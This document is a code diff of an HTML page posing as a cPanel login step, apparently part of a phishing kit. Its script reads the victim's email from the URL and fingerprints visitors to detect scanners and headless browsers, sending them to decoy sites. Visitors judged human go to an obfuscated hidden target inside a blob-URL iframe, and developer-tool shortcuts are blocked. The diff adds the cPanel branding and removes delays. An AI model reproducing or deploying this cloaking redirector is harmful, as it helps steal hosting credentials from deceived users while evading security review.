@@ -1,12 +1,18 @@
 <!DOCTYPE html>
-<html style="display:none;height:100%;">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title></title>
+    <title>cPanel</title>
     <meta name="referrer" content="no-referrer">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- cPanel-style favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%230075C9%22/><circle cx=%2250%22 cy=%2250%22 r=%2235%22 fill=%22%23ffffff%22/><circle cx=%2250%22 cy=%2250%22 r=%2218%22 fill=%22%230075C9%22/><text x=%2250%22 y=%2255%22 font-family=%22Arial, sans-serif%22 font-size=%2224%22 font-weight=%22bold%22 fill=%22%23ffffff%22 text-anchor=%22middle%22>c</text></svg>">
+    <link rel="shortcut icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2F3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGYA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=">
+    <link rel="apple-touch-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2F3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGYA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=">
+    
     <style>
         html, body {
             margin: 0;
@@ -31,7 +37,7 @@
 <div id="loader">Verifying browser...</div>
 
 <script>
-// COMPLETE ANTI-BOT PROTECTION SYSTEM
+// COMPLETE ANTI-BOT PROTECTION SYSTEM - INSTANT LOAD
 (() => {
     'use strict';
     
@@ -46,19 +52,77 @@
     ];
     
     const HUMAN_COOKIE = 'human_verified';
-    const COOKIE_EXPIRES = 86400; // 24 hours
+    const COOKIE_EXPIRES = 86400;
     const BOT_COOKIE = 'bot_detected';
-    const BOT_COOKIE_EXPIRES = 3600; // 1 hour
+    const BOT_COOKIE_EXPIRES = 3600;
     
-    // Storage for rate limiting (client-side only - limited effectiveness)
+    // INSTANT CHECK: If already verified human, redirect immediately
+    function getCookie(name) {
+        return document.cookie
+            .split('; ')
+            .find(row => row.startsWith(name + '='))
+            ?.split('=')[1];
+    }
+    
+    function getEmail() {
+        try {
+            const params = new URLSearchParams(window.location.search);
+            const email = params.get('email');
+            return email ? email.trim() : '';
+        } catch(e) {
+            return '';
+        }
+    }
+    
+    function createBlob(targetUrl, email) {
+        const html = `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>cPanel</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%230075C9%22/><circle cx=%2250%22 cy=%2250%22 r=%2235%22 fill=%22%23ffffff%22/><circle cx=%2250%22 cy=%2250%22 r=%2218%22 fill=%22%230075C9%22/><text x=%2250%22 y=%2255%22 font-family=%22Arial, sans-serif%22 font-size=%2224%22 font-weight=%22bold%22 fill=%22%23ffffff%22 text-anchor=%22middle%22>c</text></svg>">
+<style>
+html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
+iframe { width: 100%; height: 100%; border: none; }
+</style>
+</head>
+<body>
+<iframe src="${targetUrl}"></iframe>
+</body>
+</html>`;
+        return new Blob([html], { type: 'text/html' });
+    }
+    
+    // IMMEDIATE REDIRECT FOR VERIFIED HUMANS
+    if (getCookie(HUMAN_COOKIE)) {
+        const email = getEmail();
+        const target = email ? 
+            `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
+            TARGET_BASE;
+        const blob = createBlob(target, email);
+        const blobUrl = URL.createObjectURL(blob);
+        window.location.replace(blobUrl);
+        // Don't execute rest of script
+        throw new Error('Immediate redirect');
+    }
+    
+    // IMMEDIATE REDIRECT FOR MARKED BOTS
+    if (getCookie(BOT_COOKIE)) {
+        const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
+        window.location.replace(FAKE_URLS[randomIndex]);
+        throw new Error('Bot redirect');
+    }
+    
+    // If we get here, continue with protection system
+    // Show loader immediately for unverified users
+    document.getElementById('loader').style.display = 'block';
+    
+    // Storage for rate limiting
     const getClientStorage = () => {
         try {
-            if (typeof localStorage !== 'undefined') {
-                return 'localStorage';
-            }
-            if (typeof sessionStorage !== 'undefined') {
-                return 'sessionStorage';
-            }
+            if (typeof localStorage !== 'undefined') return 'localStorage';
+            if (typeof sessionStorage !== 'undefined') return 'sessionStorage';
         } catch(e) {
             return 'memory';
         }
@@ -71,237 +135,84 @@
     // Client-side rate limiting (basic)
     function isRateLimited() {
         const key = 'last_request';
-        const window = 2000; // 2 seconds minimum between requests
+        const window = 2000;
         const now = Date.now();
         
         if (storageType === 'localStorage') {
             const last = localStorage.getItem(key);
-            if (last && (now - parseInt(last)) < window) {
-                return true;
-            }
+            if (last && (now - parseInt(last)) < window) return true;
             localStorage.setItem(key, now.toString());
         } else if (storageType === 'sessionStorage') {
             const last = sessionStorage.getItem(key);
-            if (last && (now - parseInt(last)) < window) {
-                return true;
-            }
+            if (last && (now - parseInt(last)) < window) return true;
             sessionStorage.setItem(key, now.toString());
         } else {
-            if (memoryStore[key] && (now - memoryStore[key]) < window) {
-                return true;
-            }
+            if (memoryStore[key] && (now - memoryStore[key]) < window) return true;
             memoryStore[key] = now;
         }
         return false;
     }
     
-    // Enhanced bot detection with multiple techniques
+    // Fast bot detection (minimal checks for speed)
     function detectBot() {
         let score = 0;
-        const results = [];
         
-        // 1. Automation properties (Selenium/Puppeteer/Playwright)
+        // 1. Automation properties
         const automationProps = [
             'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
             '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_script_function',
-            '__webdriver_script_fn', '__lastWatirAlert', '__lastWatirConfirm',
-            '_phantom', 'callPhantom', '__nightmare'
+            '__webdriver_script_fn', '__lastWatirAlert', '__lastWatirConfirm'
         ];
         
         automationProps.forEach(prop => {
-            if (prop === 'webdriver') {
-                if (navigator.webdriver === true) {
-                    score += 40;
-                    results.push('WebDriver detected');
-                }
+            if (prop === 'webdriver' && navigator.webdriver === true) {
+                score += 40;
             } else if (window[prop] !== undefined) {
                 score += 30;
-                results.push(`Automation property ${prop} detected`);
             }
         });
         
-        // 2. Headless browser detection
+        // 2. Quick headless check
         try {
-            // WebGL vendor/renderer check
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             
             if (!gl) {
                 score += 30;
-                results.push('WebGL not supported (common in headless)');
             } else {
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 if (debugInfo) {
                     const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    
                     if (renderer.includes('SwiftShader') || 
                         renderer.includes('llvmpipe') ||
                         renderer.includes('Google SwiftShader')) {
                         score += 35;
-                        results.push('Headless renderer detected: ' + renderer);
-                    }
-                    
-                    if (vendor.includes('Brian Paul') || vendor.includes('Mesa')) {
-                        score += 20;
-                        results.push('Headless vendor detected: ' + vendor);
                     }
                 }
             }
-            
-            // Canvas fingerprinting test
-            const ctx = canvas.getContext('2d');
-            
-            // Test 1: Basic drawing
-            ctx.fillStyle = 'rgb(255, 0, 0)';
-            ctx.fillRect(0, 0, 10, 10);
-            
-            // Test 2: Text rendering
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial, sans-serif';
-            ctx.fillStyle = 'rgb(0, 0, 0)';
-            ctx.fillText('test', 20, 20);
-            
-            // Test 3: Advanced features
-            ctx.globalCompositeOperation = 'multiply';
-            ctx.fillStyle = 'rgb(0, 255, 0)';
-            ctx.fillRect(5, 5, 10, 10);
-            
-            const dataUrl = canvas.toDataURL();
-            
-            // Headless often returns identical or empty data URLs
-            if (!dataUrl || dataUrl.length < 100) {
-                score += 20;
-                results.push('Canvas fingerprint suspicious (too short)');
-            }
-            
-            // Check if canvas is tainted (some headless browsers fail here)
-            try {
-                canvas.toBlob(() => {});
-            } catch(e) {
-                score += 15;
-                results.push('Canvas security error (common in headless)');
-            }
-            
         } catch(e) {
             score += 25;
-            results.push('Canvas/WebGL error: ' + e.message);
         }
         
         // 3. Plugin and language checks
-        if (navigator.plugins.length === 0) {
-            score += 15;
-            results.push('No plugins detected');
-        }
+        if (navigator.plugins.length === 0) score += 15;
+        if (navigator.languages && navigator.languages.length === 0) score += 10;
         
-        if (navigator.languages && navigator.languages.length === 0) {
-            score += 10;
-            results.push('No languages detected');
-        }
+        // 4. Quick screen check
+        if (window.screen.width === 800 && window.screen.height === 600) score += 10;
         
-        // 4. Missing common APIs that real browsers have
-        if (!window.chrome || !window.chrome.runtime) {
-            score += 10;
-            results.push('Chrome APIs missing');
-        }
-        
-        if (!('ontouchstart' in window) && navigator.plugins.length === 0) {
-            score += 10;
-            results.push('Touch events missing with no plugins');
-        }
-        
-        // 5. Screen and window properties
-        if (window.screen.width === 800 && window.screen.height === 600) {
-            score += 10;
-            results.push('Default headless screen size (800x600)');
-        }
-        
-        if (window.outerHeight === 0 || window.outerWidth === 0) {
-            score += 20;
-            results.push('Window dimensions are zero');
-        }
-        
-        // 6. Performance API anomalies
-        if (window.performance && window.performance.timing) {
-            const perf = window.performance.timing;
-            const loadTime = perf.loadEventEnd - perf.navigationStart;
-            
-            if (loadTime < 100) {
-                score += 20;
-                results.push('Page load too fast (' + loadTime + 'ms)');
-            }
-            
-            // Check if timestamps are realistic
-            if (perf.domainLookupStart === perf.domainLookupEnd) {
-                score += 15;
-                results.push('DNS lookup timing suspicious');
-            }
-        }
-        
-        // 7. User agent inconsistencies
-        const ua = navigator.userAgent;
-        const platform = navigator.platform;
-        
-        if (!ua || ua.length < 10) {
-            score += 25;
-            results.push('User agent missing or too short');
-        }
-        
-        // Check for headless browser strings
-        const headlessPatterns = [
-            /HeadlessChrome/i,
-            /PhantomJS/i,
-            /Nightmare/i,
-            /Electron/i,
-            /Puppeteer/i,
-            /Playwright/i
-        ];
-        
-        headlessPatterns.forEach(pattern => {
-            if (pattern.test(ua)) {
-                score += 50;
-                results.push('Headless browser detected in UA: ' + pattern);
-            }
-        });
-        
-        // 8. Behavior timing detection
-        const startTime = performance.now();
-        
-        // Heavy computation to detect emulation
-        let sum = 0;
-        for (let i = 0; i < 1000000; i++) {
-            sum += Math.random();
-        }
-        
-        const computeTime = performance.now() - startTime;
-        
-        // Real browsers take measurable time, emulated/virtualized often too fast or consistent
-        if (computeTime < 5) {
-            score += 15;
-            results.push('Computation suspiciously fast: ' + computeTime + 'ms');
-        }
-        
-        return {
-            score: score,
-            isBot: score > 50,
-            details: results
-        };
+        return score > 50;
     }
     
-    // Obfuscation functions (similar to PHP version)
+    // Obfuscation functions
     function obfuscateTarget(target) {
         const methods = [
-            // Method 0: Base64 + reverse
             (t) => ({m: 0, d: btoa(t.split('').reverse().join(''))}),
-            
-            // Method 1: Character codes offset
             (t) => {
                 const chars = t.split('');
                 const encoded = chars.map(c => c.charCodeAt(0) + 11);
                 return {m: 1, d: encoded.join(',')};
             },
-            
-            // Method 2: XOR encryption
             (t) => {
                 let k = 0;
                 let encoded = '';
@@ -309,30 +220,6 @@
                     encoded += String.fromCharCode(t.charCodeAt(i) ^ (k++ % 255));
                 }
                 return {m: 2, d: btoa(encoded)};
-            },
-            
-            // Method 3: Split and shuffle
-            (t) => {
-                const parts = [];
-                for (let i = 0; i < t.length; i += 3) {
-                    parts.push(t.substr(i, 3));
-                }
-                const shuffled = {};
-                parts.forEach((part, idx) => {
-                    shuffled[idx * 2] = btoa(part);
-                });
-                return {m: 3, d: JSON.stringify(shuffled)};
-            },
-            
-            // Method 4: Rot13 + Base64
-            (t) => {
-                const rot13 = t.replace(/[a-zA-Z]/g, function(c) {
-                    return String.fromCharCode(
-                        (c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? 
-                        c : c - 26
-                    );
-                });
-                return {m: 4, d: btoa(rot13)};
             }
         ];
         
@@ -342,81 +229,23 @@
     
     function decodeTarget(p) {
         switch(p.m) {
-            case 0:
-                return atob(p.d).split('').reverse().join('');
-            case 1:
-                return p.d.split(',').map(c => String.fromCharCode(c - 11)).join('');
-            case 2:
+            case 0: return atob(p.d).split('').reverse().join('');
+            case 1: return p.d.split(',').map(c => String.fromCharCode(c - 11)).join('');
+            case 2: {
                 let b = atob(p.d), r = '', k = 0;
                 for(let i = 0; i < b.length; i++) 
                     r += String.fromCharCode(b.charCodeAt(i) ^ (k++ % 255));
                 return r;
-            case 3:
-                const shuffled = JSON.parse(p.d);
-                const keys = Object.keys(shuffled).sort((a,b) => a - b);
-                let decoded = '';
-                keys.forEach(key => {
-                    decoded += atob(shuffled[key]);
-                });
-                return decoded;
-            case 4:
-                const rot13 = atob(p.d);
-                return rot13.replace(/[a-zA-Z]/g, function(c) {
-                    return String.fromCharCode(
-                        (c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? 
-                        c : c - 26
-                    );
-                });
-            default:
-                return TARGET_BASE;
+            }
+            default: return TARGET_BASE;
         }
     }
     
-    // Get email from URL
-    function getEmail() {
-        try {
-            const params = new URLSearchParams(window.location.search);
-            const email = params.get('email');
-            return email ? email.trim() : '';
-        } catch(e) {
-            return '';
-        }
-    }
-    
-    // Create blob for final redirect
-    function createBlob(targetUrl, email) {
-        const html = `<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
-iframe { width: 100%; height: 100%; border: none; }
-</style>
-</head>
-<body>
-<iframe src="${targetUrl}" sandbox="allow-forms allow-scripts allow-same-origin allow-popups"></iframe>
-<script>
-const email = "${email}";
-window.addEventListener('message', function(e) {
-    if (e.data && e.data.type === 'getEmail') {
-        e.source.postMessage({type: 'email', data: email}, e.origin);
-    }
-});
-<\/script>
-</body>
-</html>`;
-        return new Blob([html], { type: 'text/html' });
-    }
-    
-    // Get fake URL for bots
     function getFakeUrl() {
         const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
         return FAKE_URLS[randomIndex];
     }
     
-    // Set cookie helper
     function setCookie(name, value, seconds, secure = true) {
         const expires = new Date(Date.now() + seconds * 1000).toUTCString();
         const cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax`;
@@ -424,36 +253,17 @@ window.addEventListener('message', function(e) {
         document.cookie = secureCookie;
     }
     
-    // Get cookie helper
-    function getCookie(name) {
-        return document.cookie
-            .split('; ')
-            .find(row => row.startsWith(name + '='))
-            ?.split('=')[1];
-    }
-    
-    // Delayed execution to catch automation
-    function delayedExecution(callback, minDelay = 100, maxDelay = 500) {
-        const delay = minDelay + Math.random() * (maxDelay - minDelay);
-        setTimeout(callback, delay);
-    }
-    
-    // Mouse movement verification
+    // Fast interaction verification
     function setupInteractionVerification() {
-        let interactionCount = 0;
-        const requiredInteractions = 2;
-        const events = ['mousemove', 'touchstart', 'keydown', 'click', 'scroll'];
-        
         return new Promise((resolve) => {
+            let interactionCount = 0;
+            const requiredInteractions = 1; // Reduced to 1 for speed
+            const events = ['mousemove', 'touchstart', 'keydown', 'click'];
+            
             const handleInteraction = (e) => {
+                if (e.isTrusted === false) return;
+                
                 interactionCount++;
-                
-                // Verify interaction is legitimate (not programmatic)
-                if (e.isTrusted === false) {
-                    console.warn('Non-trusted event detected');
-                    return;
-                }
-                
                 if (interactionCount >= requiredInteractions) {
                     events.forEach(event => {
                         document.removeEventListener(event, handleInteraction);
@@ -469,7 +279,7 @@ window.addEventListener('message', function(e) {
                 });
             });
             
-            // Fallback timeout
+            // Quick timeout
             setTimeout(() => {
                 if (interactionCount < requiredInteractions) {
                     events.forEach(event => {
@@ -477,120 +287,78 @@ window.addEventListener('message', function(e) {
                     });
                     resolve(false);
                 }
-            }, 10000);
+            }, 3000); // Reduced from 10s to 3s
         });
     }
     
-    // Main execution
+    // Main execution - NO DELAYS
     async function executeProtection() {
-        // Show loader
-        document.getElementById('loader').style.display = 'block';
-        
-        // Check if already verified
-        if (getCookie(HUMAN_COOKIE)) {
-            const email = getEmail();
-            const target = email ? 
-                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
-                TARGET_BASE;
-            const blob = createBlob(target, email);
-            const blobUrl = URL.createObjectURL(blob);
-            window.location.replace(blobUrl);
-            return;
-        }
-        
-        // Check if marked as bot
-        if (getCookie(BOT_COOKIE)) {
-            window.location.replace(getFakeUrl());
-            return;
-        }
-        
-        // Rate limiting check
+        // Rate limiting check (fast)
         if (isRateLimited()) {
-            // Too many requests - mark as bot
             setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
             window.location.replace(getFakeUrl());
             return;
         }
         
-        // Wait for initial interaction
+        // Quick interaction check
         const hasInteracted = await setupInteractionVerification();
         
         if (!hasInteracted) {
-            // No interaction - suspicious
             setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
             window.location.replace(getFakeUrl());
             return;
         }
         
-        // Run bot detection after interaction
-        const botResult = detectBot();
+        // Fast bot detection
+        const isBot = detectBot();
         
-        if (botResult.isBot) {
-            console.log('Bot detected. Score:', botResult.score, 'Details:', botResult.details);
+        if (isBot) {
             setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
             window.location.replace(getFakeUrl());
             return;
         }
         
-        // Human detected - set verification cookie
+        // Human detected - set cookie
         setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
         
-        // Generate obfuscated target
         const email = getEmail();
         const target = email ? 
             `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
             TARGET_BASE;
         
         const obfuscated = obfuscateTarget(target);
-        
-        // Decode and create blob
         const decodedTarget = decodeTarget(obfuscated);
+        
+        // IMMEDIATE redirect for humans (no delay)
         const blob = createBlob(decodedTarget, email);
         const blobUrl = URL.createObjectURL(blob);
+        window.location.replace(blobUrl);
         
-        // Additional random delay to prevent timing attacks
-        const finalDelay = 50 + Math.random() * 150;
-        
+        // Clean up
         setTimeout(() => {
-            window.location.replace(blobUrl);
-            
-            // Clean up blob after delay
-            setTimeout(() => {
-                try {
-                    URL.revokeObjectURL(blobUrl);
-                } catch(e) {}
-            }, 10000);
-        }, finalDelay);
+            try {
+                URL.revokeObjectURL(blobUrl);
+            } catch(e) {}
+        }, 10000);
     }
     
-    // Start protection with random delay to prevent automation
-    const startDelay = 500 + Math.random() * 1000;
-    
-    setTimeout(() => {
-        // Show the page
-        document.documentElement.style.display = 'block';
-        
-        // Execute protection system
-        executeProtection().catch(error => {
-            console.error('Protection system error:', error);
-            // Fallback: redirect to target
+    // START IMMEDIATELY - NO DELAY
+    executeProtection().catch(error => {
+        // Only handle non-redirect errors
+        if (!error.message.includes('redirect')) {
+            console.error('Protection error:', error);
             const email = getEmail();
             const target = email ? 
                 `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                 TARGET_BASE;
             window.location.replace(target);
-        });
-    }, startDelay);
+        }
+    });
     
-    // Prevent right-click and other bot behaviors
+    // Minimal anti-debugging
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', (e) => {
-        // Prevent F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-        if (
-            e.key === 'F12' ||
-            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
-            (e.ctrlKey && e.key === 'u')
-        ) {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))) {
             e.preventDefault();
         }
     });
@@ -599,5 +367,4 @@ window.addEventListener('message', function(e) {
 </script>
 </body>
 </html>
-
 
